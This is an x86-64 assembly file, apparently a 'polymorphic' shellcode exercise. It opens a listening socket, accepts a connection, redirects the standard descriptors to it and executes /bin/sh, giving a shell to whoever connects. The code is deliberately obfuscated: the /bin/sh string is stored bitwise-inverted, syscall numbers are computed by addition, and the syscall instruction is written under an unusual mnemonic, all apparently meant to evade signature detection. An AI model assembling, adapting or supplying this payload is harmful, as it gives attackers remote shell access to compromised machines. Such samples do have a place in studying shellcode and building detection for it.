; polymorphic #859
; original length: 57
; target length:  85 or less
section .text
global _start
_start:
origin:
	
	xor rsi,rsi
	mul rsi
	inc esi
	push byte +0x2
	pop rdi
	; mov al,0x29
	mov al, 0x3
	add al, 0x26
	loadall286
	push rdx
	pop rsi
	push rax
	pop rdi
	; mov al,0x32
	mov al, 0x3
	add al, 0x2f
	loadall286
	; mov al,0x2b
	mov al, 0x3
	add al, 0x28
	loadall286
	push rdi
	pop rsi
	mov ecx, esi
	xchg rax,rdi
dup2:
	dec esi
	; mov al,0x21
	mov al, 0x3
	add al, 0x1e
	push rcx
	loadall286
	pop rcx
	dec ecx
	jnz dup2
	push rdx

	;;; mov rdi,0x68732f6e69622f2f		; hs/nib//
	;;; 0x978cd091969dd0d0 NOT
	push rdx
	;push dword 0x69622f2f
	mov dword [rsp],  0x969dd0d0   ;  0x69622f2f NOT 
	;mov dword [rsp+4], 0x68732f6e 
	mov dword [rsp+4], 0x978cd091	; 0x68732f6e NOT 
	pop rdi
	not rdi		;NOT back to //bin/sh

	push rdi
	push rsp
	pop rdi

	;;; mov al,0x3b
	mov al, 0x3
	add al, 0x38
	loadall286


